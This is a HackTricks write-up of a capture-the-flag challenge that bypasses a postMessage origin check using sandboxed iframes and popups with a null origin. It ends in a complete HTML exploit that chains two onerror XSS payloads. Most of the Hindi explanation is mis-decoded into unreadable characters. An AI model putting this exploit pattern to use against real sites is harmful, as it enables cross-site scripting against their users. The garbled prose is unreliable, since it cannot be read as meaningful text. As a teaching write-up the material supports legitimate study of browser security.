# Bypassing SOP with Iframes - 1

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Iframes in SOP-1

рдЗрд╕ [**рдЪреБрдиреМрддреА**](https://github.com/terjanq/same-origin-xss) рдореЗрдВ рдЬреЛ [**NDevTK**](https://github.com/NDevTK) рдФрд░ [**Terjanq**](https://github.com/terjanq) рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ, рдЖрдкрдХреЛ рдХреЛрдб рдореЗрдВ XSS рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдирд╛ рд╣реИ
```javascript
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
const data = e.data;
if (e.origin !== window.origin && data.identifier !== identifier) return;
if (data.type === 'render') {
renderContainer.innerHTML = data.body;
}
}
```
The main problem is that the [**main page**](https://so-xss.terjanq.me) uses DomPurify to send the `data.body`, so in order to send your own html data to that code you need to **bypass** `e.origin !== window.origin`.

Let's see the solution they propose.

### SOP bypass 1 (e.origin === null)

рдЬрдм `//example.org` рдХреЛ рдПрдХ **sandboxed iframe** рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдкреГрд╖реНрда рдХрд╛ **origin** **`null`** рд╣реЛрдЧрд╛, рдпрд╛рдиреА **`window.origin === null`**ред рдЗрд╕рд▓рд┐рдП `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ iframe рдХреЛ рдПрдореНрдмреЗрдб рдХрд░рдХреЗ рд╣рдо **`null` origin** рдХреЛ **force** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдпрджрд┐ рдкреГрд╖реНрда **embeddable** рд╣реЛрддрд╛, рддреЛ рдЖрдк рдЙрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рдереЗ (рдХреБрдХреАрдЬрд╝ рдХреЛ рднреА `SameSite=None` рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ)ред

### SOP bypass 2 (window.origin === null)

рдХрдо рдЬреНрдЮрд╛рдд рддрдереНрдп рдпрд╣ рд╣реИ рдХрд┐ рдЬрдм **sandbox value `allow-popups` рд╕реЗрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рдЦреБрд▓рд╛ рд╣реБрдЖ рдкреЙрдкрдЕрдк** рд╕рднреА **sandboxed attributes** рдХреЛ **inherit** рдХрд░реЗрдЧрд╛ рдЬрдм рддрдХ рдХрд┐ `allow-popups-to-escape-sandbox` рд╕реЗрдЯ рди рдХрд┐рдпрд╛ рдЬрд╛рдПред\
рдЗрд╕рд▓рд┐рдП, **null origin** рд╕реЗ рдПрдХ **popup** рдЦреЛрд▓рдиреЗ рдкрд░ рдкреЙрдкрдЕрдк рдХреЗ рдЕрдВрджрд░ **`window.origin`** рднреА **`null`** рд╣реЛрдЧрд╛ред

### Challenge Solution

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдЪреБрдиреМрддреА рдХреЗ рд▓рд┐рдП, рдХреЛрдИ **iframe** **create** рдХрд░ рд╕рдХрддрд╛ рд╣реИ, **рдПрдХ рдкреЙрдкрдЕрдк** рдХреЛ рдЙрд╕ рдкреГрд╖реНрда рдкрд░ рдЦреЛрд▓ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХрдордЬреЛрд░ XSS рдХреЛрдб рд╣реИрдВрдбрд▓рд░ (`/iframe.php`) рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ `window.origin === e.origin` рдХреНрдпреЛрдВрдХрд┐ рджреЛрдиреЛрдВ `null` рд╣реИрдВ, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рдПрдХ payload рднреЗрдЬрд╛ рдЬрд╛рдП рдЬреЛ XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░реЗрдЧрд╛**ред

рд╡рд╣ **payload** **identifier** рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ **XSS** рдХреЛ **рдКрдкрд░ рдХреЗ рдкреГрд╖реНрда** (рдкреГрд╖реНрда рдЬреЛ рдкреЙрдкрдЕрдк рдЦреЛрд▓рддрд╛ рд╣реИ) рдкрд░ **рд╡рд╛рдкрд╕ рднреЗрдЬреЗрдЧрд╛**, **рдЬреЛ** **рд╕реНрдерд╛рди** рдХреЛ **рдХрдордЬреЛрд░** `/iframe.php` рдкрд░ **рдмрджрд▓ рджреЗрдЧрд╛**ред рдЪреВрдВрдХрд┐ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдЬреНрдЮрд╛рдд рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдорд╛рдпрдиреЗ рдирд╣реАрдВ рд░рдЦрддрд╛ рдХрд┐ рд╢рд░реНрдд `window.origin === e.origin` рд╕рдВрддреБрд╖реНрдЯ рдирд╣реАрдВ рд╣реИ (рдпрд╛рдж рд░рдЦреЗрдВ, origin рд╡рд╣ **popup** рд╣реИ рдЬреЛ iframe рд╕реЗ **origin** **`null`** рд╣реИ) рдХреНрдпреЛрдВрдХрд┐ `data.identifier === identifier`ред рдлрд┐рд░, **XSS рдлрд┐рд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛**, рдЗрд╕ рдмрд╛рд░ рд╕рд╣реА origin рдореЗрдВред
```html
<body>
<script>
f = document.createElement('iframe');

// Needed flags
f.sandbox = 'allow-scripts allow-popups allow-top-navigation';

// Second communication with /iframe.php (this is the top page relocated)
// This will execute the alert in the correct origin
const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
},1000);`.replaceAll('\n',' ');

// Initial communication
// Open /iframe.php in a popup, both iframes and popup will have "null" as origin
// Then, bypass window.origin === e.origin to steal the identifier and communicate
// with the top with the second XSS payload
f.srcdoc = `
<h1>Click me!</h1>
<script>
onclick = e => {
let w = open('https://so-xss.terjanq.me/iframe.php');
onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
setTimeout(_ => {
w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
}, 1000);
};
<\/script>
`
document.body.appendChild(f);
</script>
</body>
```
{% hint style="success" %}
рд╕реАрдЦреЗрдВ рдФрд░ AWS рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
рд╕реАрдЦреЗрдВ рдФрд░ GCP рд╣реИрдХрд┐рдВрдЧ рдХрд╛ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
{% endhint %}
